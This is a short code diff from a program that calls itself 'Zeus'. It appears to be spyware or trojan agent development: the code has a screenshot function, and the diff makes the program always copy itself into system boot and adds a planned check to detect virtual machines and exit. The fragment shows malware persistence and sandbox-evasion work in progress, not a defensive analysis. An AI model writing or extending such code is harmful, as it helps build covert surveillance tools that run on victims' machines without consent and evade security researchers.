@@ -63,12 +63,11 @@ def takeScreenshot():
 def main():
     print("Starting Zeus...")
 
+    # Check if we run in Virtual Machine - Kill if yes
+
     # Check if agents exists on device, if not - immediately copy itself to system boot/run
     bootHandler = BootPersistanceHandler()
-
-    isZeusExists = checkIfExists()
-    if not isZeusExists:
-        bootHandler.addSelfToSystemToBoot()
+    bootHandler.addSelfToSystemToBoot() # Ignore if we already exists
 
     didLoadConfSuccfully = loadConfigurations()
     if didLoadConfSuccfully:
